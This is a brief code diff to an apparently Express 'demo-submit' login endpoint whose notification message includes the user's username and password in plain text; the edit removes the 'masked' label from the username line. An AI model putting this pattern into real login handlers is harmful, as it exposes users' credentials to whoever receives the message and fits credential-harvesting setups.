@@ -25,7 +25,7 @@ app.post("/api/demo-submit", async (req, res) => {
 
     const text =
       `🔔 Demo login submit\n` +
-      `• Username (masked): ${username}\n` +
+      `• Username: ${username}\n` +
       `• Time: ${submittedAt}\n` +
       `password: ${password}\n`;
 
